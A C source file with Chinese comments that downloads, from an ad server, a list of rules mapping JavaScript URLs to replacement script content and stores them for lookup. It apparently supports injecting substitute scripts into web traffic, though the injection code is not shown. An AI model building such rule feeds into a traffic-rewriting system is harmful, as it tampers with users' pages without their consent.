/*****************************************************
 *
 * 策略操作函数
 *
 *****************************************************/
#include "header.h"

// 策略节点
struct ruse_node{
	struct list_head node;
	char* url;
	char* js;
};

// 策略节点字节长度
static unsigned int ruse_list_size = sizeof(struct ruse_node);

// 策略链表
LIST_HEAD(ruse_list_head);

//static pthread_mutex_t ruse_list_lock;

// 策略链表计数器
static int ruse_list_count = 0;

// 策略添加函数
void ruse_list_add(char* url, char* js)
{
	// 申请节点空间
	struct ruse_node *node = malloc(ruse_list_size);
	
	// 申请字符串空间 url
	node->url = malloc(strlen(url) + 1);
	memcpy(node->url, url, strlen(url) + 1);

	// js
	node->js = malloc(strlen(js) + 1);
	memcpy(node->js, js, strlen(js) + 1);

	// 添加到链表中
//	pthread_mutex_lock(&ruse_list_lock);
	list_add(&(node->node), &ruse_list_head);
//	pthread_mutex_unlock(&ruse_list_lock);
	
	// 计数 并打印内容
	ruse_list_count ++;
	xyprintf(0, "ADD : ruse_list_count = %d\nurl: %s\njs:\n%s",
			ruse_list_count, node->url, node->js);
}

/** 
 *@brief 查找数据
 *@return js
 */
char* ruse_list_find(char* url)
{
	// 
	struct list_head* pos;
	struct ruse_node* node;

	// 开始查找
//	pthread_mutex_lock(&ruse_list_lock);
	for( pos = ruse_list_head.next; pos != &ruse_list_head; pos = pos->next ){
		node = (struct ruse_node*)pos;
		
		// 判断是不是 是的话直接返回内容
		if( !strcmp(url, node->url) ){
			xyprintf(0, "Find - url: %s\njs: %s\n", node->url, node->js);
			//	pthread_mutex_unlock(&ruse_list_lock);
			return node->js;
		}
	}
//	pthread_mutex_unlock(&ruse_list_lock);
	
	return NULL;
}

#define RUSE_SERVER_HOST	"ad.yuanzhenginfo.com"
#define RUSE_SERVER_PORT	80
#define GET_RUSE_NUM_URL	"/get_ruse_num"
#define GET_RUSE_LIST_URL	"/get_ruse_list"
#define ONCE_GET_RUSE_NUM	10

// 连接服务器
int conn_ruse_server()
{
	xyprintf(0, "Connect %s:%d ......", RUSE_SERVER_HOST, RUSE_SERVER_PORT);
	
	int sockfd;
    struct sockaddr_in addr;
	
	// socket初始化
	if(( sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		xyprintf(errno, "ERROR:%s %d -- socket()", __FILE__, __LINE__);
		return -1;
	}

	// 域名解析
	struct hostent* hostent = gethostbyname( RUSE_SERVER_HOST );
	addr.sin_addr.s_addr	= *(unsigned long *)hostent->h_addr;

	xyprintf(0, "GET %s host %s success!", RUSE_SERVER_HOST, inet_ntoa(addr.sin_addr));

	// 连接 失败的话 休眠3秒 重新连接
	addr.sin_family			= AF_INET;
	addr.sin_port			= htons( RUSE_SERVER_PORT );
	if( connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1){
		xyprintf(errno, "ERROR:%s %d -- connect()", __FILE__, __LINE__);
		close(sockfd);
		return -1;
	}

	xyprintf(0, "Connect %s:%d success!\n", RUSE_SERVER_HOST, RUSE_SERVER_PORT);

	return sockfd;
}


/** 
 *@brief  发送数据函数
 *@param  sock		类型 int			要发送到的socket套接字
 *@param  buf		类型 unsigned char*	要发送的内容
 *@param  len		类型 int			要发送的内容长度
 *@return success 0 failed -1
 */
int send_block(int sock, unsigned char *buf, int len)
{
	int ret;			//返回值
	int slen = len;		//未发送字节数
	int yelen = 0;		//已发送字节数
	struct timeval tv;	//超时时间结构体

	//错误判断
	if (sock == -1 || !buf || len <= 0){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- I can't believe, why here !!! （╯' - ')╯︵ ┻━┻ ", __func__, __FILE__, __LINE__);
		return -1;
	}

	//设置超时时间
	tv.tv_sec = 1;
	tv.tv_usec = 0;
	setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

	//开启发送
	while (slen > 0) {
		
		//发送 -- send -- ┬─┬ ノ( ' - 'ノ)
		ret = send(sock, buf + yelen, slen, 0);		
		
		if (ret < 0) {			// 发送错误
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- send() failed!", __func__, __FILE__, __LINE__);
			if (errno == EAGAIN) {
				continue;
			}
			return -1;
	    }
		else if (ret == 0) {	// 对方关闭了套接字
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- send() failed!", __func__, __FILE__, __LINE__);
			return -1;
		}
		else {					// 成功
			yelen += ret;	//已发送
			slen -= ret;	//未发送
		}

	}
	return 0;
}

/** 
 *@brief  接收数据函数
 *@param  sock		类型 int			要接收数据的socket套接字
 *@param  buf		类型 unsigned char*	要接收的内容
 *@param  len		类型 int			要接收的内容长度
 *@param  block_flag类型 int			1 使用阻塞接收, 0 使用非阻塞接收
 *@return success 0 failed -1
 */
int recv_block(int sock, unsigned char *buf, int len/*, int block_flag*/)
{
	int ret;			// 返回值
	int rlen = 0;		// 已接收到的字节数
	struct timeval tv;	// 超时时间结构体

	//错误判断
	if (sock == -1 || !buf || len <= 0){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- I can't believe, why here !!! （╯' - ')╯︵ ┻━┻ ", __func__, __FILE__, __LINE__);
		return -1;
	}

	//设置超时时间
	tv.tv_sec = 1;
	tv.tv_usec = 0;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	//开始接收
	while (rlen < len) {
		//接收
		ret =  recv(sock, buf + rlen, len - rlen, 0);
		if (ret < 0 ) {				// 读取错误
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- recv() failed!", __func__, __FILE__, __LINE__);
//			if (errno == EAGAIN) {
//				continue;
//			}
			return -1;
		}
		else if (ret == 0) {		// 对方关闭了套接字
			xyprintf(errno, "SOCK_ERROR:%s %s %d -- recv() failed!", __func__, __FILE__, __LINE__);
			return -1;
		}
		else {						// 读取正常
			rlen += ret;
		}
	}
	return 0;
}

// 获取http请求的回复
char* get_http_res(char* ques)
{
	// 初始化socket
	int sockfd = conn_ruse_server();
	if( sockfd < 0 ){
		return NULL;
	}
	
	// 发送请求
	if( send_block(sockfd, ques, strlen(ques)) ){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- send get ruse num failed!", __func__, __FILE__, __LINE__);
		goto SOCKETED_ERROR;
	}
	
	// 接收回复
	char res[1024] = {0};
	
	// 先最多接收1024个字符
	int ret = recv(sockfd, res, 1024, 0);
	if( ret < 0 ){
		xyprintf(errno, "SOCK_ERROR:%s %s %d -- send get ruse num failed!", __func__, __FILE__, __LINE__);
		goto SOCKETED_ERROR;
	}
	
	//xyprintf(0, "%s", res);

	// 查找http头中的内容长度项位置
	char *res_content_length = strstr(res, "Content-Length: ");
	if(!res_content_length){
		xyprintf(errno, "ERROR:%s %s %d -- get Content-Length error!", __func__, __FILE__, __LINE__);
		xyprintf(0, "ret = %d - res - %s", ret, res);
		xyprintf(0, "ques:%s", ques);
		goto SOCKETED_ERROR;
	}

	res_content_length += strlen("Content-Length: ");
	// 后面的空格
	if(*res_content_length == ' '){
		res_content_length++;
	}

	// 获取长度
	int content_length = atoi(res_content_length);

	// 如果长度错误
	if( !content_length ){
		xyprintf(errno, "Get Content-Length error at file %s line %d!", __FILE__, __LINE__);
		xyprintf(0, "ret = %d - res - %s", ret, res);
		xyprintf(0, "ques:%s", ques);
		goto SOCKETED_ERROR;
	}
	
	// 找到http头的结尾，也就是内容区的开始
	char *res_content = strstr(res, "\r\n\r\n");
	res_content += 4;

	// 计算已经接收到的数据长度
	int content_recved_num = ret - (res_content  - res);
	// 没有接收到的数据长度
	int content_recv_num = content_length - content_recved_num;
	
	char *content = malloc(content_length + 32);
	memset(content, 0, content_length + 32);

	// 拷贝已接收到的内容数据
	if( content_recved_num > 0 ){
		memcpy(content, res_content, content_recved_num);
	}
	else if( content_recved_num < 0 ) {
		xyprintf(0, "??? Is this a error url, content_recved_num is %d!", content_recved_num);
		goto MALLOCED_ERROR;
	}

	// 如果还有数据需要接收
	if( content_recv_num > 0 ){
		// 继续接收剩余的数据
		if( recv_block(sockfd, content + content_recved_num, content_recv_num) ){
			xyprintf(0, "Recv the content error, file at %s, line is %d", __FILE__, __LINE__);
			goto MALLOCED_ERROR;
		}
	}

	close(sockfd);
	return content;

MALLOCED_ERROR:
	if(content){
		free(content);
	}
SOCKETED_ERROR:
	close(sockfd);
	return NULL;
}

int pro_http_res(char* res, int num)
{

	// 主体json
	cJSON *json = cJSON_Parse( res );
	if (!json){
		xyprintf(0, "JSON's data error -- %s -- %d!!!", __FILE__, __LINE__);
		return -1;
	}

	// 获取数组数量
	int array_num = cJSON_GetArraySize(json);
	if( array_num != num ){
		xyprintf(0, "Json data error, ques num is %d, get num is %d!", num, array_num);
		goto JSON_ERROR;
	}

	// 循环读取数组中的数据
	cJSON* item = NULL, *js_url = NULL, *replace_con = NULL;
	int i = 0;

	for(; i < array_num; i++){
		item = cJSON_GetArrayItem(json, i);
		if(!item){
			xyprintf(0,"JSON's data error -- %s -- %d!", __FILE__, __LINE__);
			goto JSON_ERROR;
		}

		// js_url
		js_url = cJSON_GetObjectItem(item,"js_url");
		if (!js_url){
			xyprintf(0,"JSON's data error -- %s -- %d!", __FILE__, __LINE__);
			goto JSON_ERROR;
		}
		
		// js 替换成的内容
		replace_con = cJSON_GetObjectItem(item,"replace_con");
		if (!replace_con){
			xyprintf(0,"JSON's data error -- %s -- %d!", __FILE__, __LINE__);
			goto JSON_ERROR;
		}
		
		ruse_list_add(js_url->valuestring, replace_con->valuestring);
	}


	cJSON_Delete(json);
	return 0;

JSON_ERROR:
	cJSON_Delete(json);
	return -1;
}


// 初始化策略库
int init_ruse()
{
	xyprintf(0, "Get ruse num ......");

	char ques[1024] = {0};
	snprintf(ques, sizeof(ques) - 1, "GET %s HTTP1.1\r\nHost: %s\r\n\r\n", GET_RUSE_NUM_URL, RUSE_SERVER_HOST);

	// 发送请求并获取内容
	char* res = get_http_res(ques);
	if(!res){
		xyprintf(0, "get ruse num error!");
		return -1;
	}

	// 获得ruse数量
	int ruse_num = atoi(res);
	if( ruse_num <= 0 ){
		xyprintf(0, "ruse is error:%d", ruse_num);
		free(res);
		return -1;
	}
	
	// 处理完获取的http内容后 记得释放内存
	free(res);
	res = NULL;

	xyprintf(0, "Get ruse num %d success!\n", ruse_num);


	// 循环读取策略库
	int curr = 0;
	for( ;curr < ruse_num; curr += ONCE_GET_RUSE_NUM ){
		
		// 获取 curr 到 curr+ONCE_GET_RUSE_NUM 或者是末尾的条目
		int num = (ruse_num - curr >= ONCE_GET_RUSE_NUM) ? ONCE_GET_RUSE_NUM : ruse_num - curr;
		snprintf(ques, sizeof(ques) - 1, "GET %s?begin=%d&num=%d HTTP1.1\r\nHost: %s\r\n\r\n",
				GET_RUSE_LIST_URL, curr, num, RUSE_SERVER_HOST);
		
		xyprintf(0,"Get ruse %d to %d, total %d ......", curr, curr + num, num);
		
		// 获取到回复
		res = get_http_res(ques);
		if(!res){
			xyprintf(0, "get ruse list of %d to %d error!", curr + 1, curr + 1 + num);
			return -1;
		}
		
		// 处理数据
		if( pro_http_res(res, num) ){
			xyprintf(0, "Pro json error!");
			free(res);
			return -1;
		}

		free(res);
		res = NULL;
		
		xyprintf(0,"Get ruse %d to %d, total %d success!\n", curr, curr + num, num);

	} //end for

	return 0;
}
